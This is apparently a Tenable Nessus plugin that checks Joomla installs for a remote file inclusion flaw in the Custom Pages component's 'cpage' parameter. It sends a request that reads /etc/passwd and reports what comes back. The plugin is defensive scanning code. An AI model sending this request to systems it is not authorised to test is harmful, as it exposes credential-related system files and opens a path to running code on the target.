#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31646);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2008-1505");
  script_bugtraq_id(28409);
  script_xref(name:"milw0rm", value:"5294");
  script_xref(name:"OSVDB", value:"43672");

  script_name(english:"Custom Pages for Joomla! index.php cpage Variable Remote File Inclusion");
  script_summary(english:"Tries to read a local file with Custom Pages");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
remote file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Custom Pages, a third-party component for
Joomla for building and adding custom pages. 

The version of Custom Pages installed on the remote host fails to
sanitize user-supplied input to the 'cpage' parameter before using it
to include PHP code in the 'custompages.php' script.  Regardless of
PHP's 'register_globals' setting, an unauthenticated remote attacker
can exploit this issue to view arbitrary files on the remote host or
to execute arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to retrieve a local file.
  file = "/etc/passwd";

  r = http_send_recv3(method:"GET", port: port,
    item:string(dir, "/index.php?", 
      "option=com_custompages&",
      "cpage=", file));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error claiming the file doesn't exist or...
    string("main(", file, "): failed to open stream: No such file") >< res ||
    string("include(", file, ") [function.include]: failed to open stream: No such file") >< res ||
    # we get an error about open_basedir restriction.
    string("open_basedir restriction in effect. File(", file) >< res
  )
  {
    if (report_verbosity && egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = res;
      if ('body_outer">' >< contents) contents = strstr(contents, 'body_outer">') - 'body_outer">';
      if ('</td>' >< contents) contents = contents - strstr(contents, '</td>');
      if (contents)
      {
        while (strlen(contents) && contents[0] =~ '[ \t\n\r]')
          contents = substr(contents, 1);
      }
      if (contents) contents = chomp(contents);

      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
